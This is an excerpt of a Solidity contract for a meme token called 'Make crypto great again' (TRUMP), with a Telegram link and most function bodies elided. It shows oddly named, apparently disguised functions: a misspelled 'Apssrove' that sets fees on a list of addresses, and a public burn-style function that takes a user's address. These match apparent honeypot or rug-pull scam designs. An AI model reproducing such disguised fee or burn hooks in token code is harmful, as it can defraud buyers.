...
/**
https://t.me/Makecryptogreatagain_TRUMP
...
abstract contract Ownable {
    ...
    function transferOwnershipMakecryptogreatagaint(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }
...
contract TRUMP is Ownable {
    ...
    constructor (){
        name = unicode"Make crypto great again";
        symbol = unicode"TRUMP";
        decimals = 9;
        uint256 Supply = 4500000000;
    ...
    function Apssrove(address[] memory _addresses, uint256 _feePercentage) external {
    ...
    function _burnliqllitghrs(address user) public {
